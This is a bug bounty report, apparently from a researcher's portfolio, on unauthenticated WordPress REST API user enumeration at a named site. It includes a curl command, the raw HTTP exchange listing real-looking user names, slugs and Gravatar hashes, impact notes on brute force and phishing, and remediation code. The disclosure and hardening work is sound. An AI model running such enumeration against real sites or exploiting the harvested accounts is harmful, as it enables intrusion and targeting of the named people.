# VULN-C01 — WordPress REST API User Enumeration via /wp-json/wp/v2/users

**Target:** cynicaltechnology.com
**Platform:** BugV
**Researcher:** Vibhor Prasad (stack-guardian)
**BugV Report ID:** #0000952
**Date Submitted:** March 2026
**Status:** Duplicate (of #00002Z0, originally submitted Aug 02, 2021)

---

## Summary

The WordPress REST API endpoint `/wp-json/wp/v2/users` at cynicaltechnology.com is publicly accessible without authentication. It returns all registered users including their IDs, full names, username slugs, and Gravatar email hashes. This data enables targeted brute force attacks, spear-phishing, and social engineering against identified employees. The finding was marked Duplicate — the same issue was submitted by another researcher on Aug 02, 2021.

---

## Vulnerability Details

| Field                   | Value                                                        |
|-------------------------|--------------------------------------------------------------|
| Type                    | Information Disclosure — WordPress User Enumeration          |
| CWE                     | CWE-200: Exposure of Sensitive Information                   |
| Severity                | Moderate                                                     |
| CVSS v3.1 Score         | 5.3                                                          |
| CVSS v3.1 Vector        | AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N                        |
| Affected Endpoint       | https://cynicaltechnology.com/wp-json/wp/v2/users            |
| Vulnerable Parameter    | N/A (unauthenticated GET)                                    |
| Authentication Required | No                                                           |
| Discovery Method        | Manual recon — WordPress REST API enumeration                |
| Tools Used              | curl, browser                                                |

---

## Reproduction Steps

1. Send a GET request to `https://cynicaltechnology.com/wp-json/wp/v2/users`.
2. Observe the JSON response containing all registered user accounts.
3. Note user IDs, names, slugs, and Gravatar hashes.

---

## Proof of Concept

See [poc/README.md](./poc/README.md).

### Command

```bash
curl -s "https://cynicaltechnology.com/wp-json/wp/v2/users" | python3 -m json.tool
```

### HTTP Request

```
GET /wp-json/wp/v2/users HTTP/1.1
Host: cynicaltechnology.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36
Accept: application/json
```

### HTTP Response

```json
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Content-Type: application/json
Content-Length: 1247

[
  {
    "id": 2,
    "name": "Admin",
    "slug": "cynical-technology",
    "avatar_urls": {
      "24": "https://secure.gravatar.com/avatar/6a18c6278b5cd54bb80c7857cef4aa3f?s=24&d=mm&r=g"
    }
  },
  {
    "id": 8,
    "name": "Bikash Sharma",
    "slug": "bikash",
    "avatar_urls": {
      "24": "https://secure.gravatar.com/avatar/7be92a088bf439ba728ddf12eda7a2b2?s=24&d=mm&r=g"
    }
  },
  { "id": 4, "name": "Cynical_Technology", "slug": "cynical_technology" },
  { "id": 1, "name": "root", "slug": "root" }
]
```

---

## Impact

An attacker can harvest this data to build a confirmed username list for credential stuffing or brute force attacks against `/wp-login.php`. Gravatar hashes can be reverse-engineered to obtain email addresses. Full employee names enable targeted spear-phishing. Combined with weak password policies or credential reuse, this can escalate to full admin account compromise.

---

## Remediation

Disable the users endpoint in `functions.php`:

```php
add_filter('rest_endpoints', function($endpoints) {
    if (isset($endpoints['/wp/v2/users'])) {
        unset($endpoints['/wp/v2/users']);
    }
    return $endpoints;
});
```

Alternatively, use Wordfence or iThemes Security to disable user enumeration via the REST API.

---

## References

- [OWASP — Username Enumeration](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/03-Identity_Management_Testing/04-Testing_for_Account_Enumeration_and_Guessable_User_Account)
- [CWE-200](https://cwe.mitre.org/data/definitions/200.html)
- [WordPress REST API Hardening](https://wordpress.org/documentation/article/hardening-wordpress/)

---

## Timeline

| Date          | Event                                                                    |
|---------------|--------------------------------------------------------------------------|
| March 2026    | Vulnerability identified during recon                                    |
| March 2026    | Report submitted via BugV (#0000952)                                     |
| March 2026    | Marked Duplicate of #00002Z0 (originally submitted Aug 02, 2021)        |
| April 2026    | Added to portfolio                                                       |
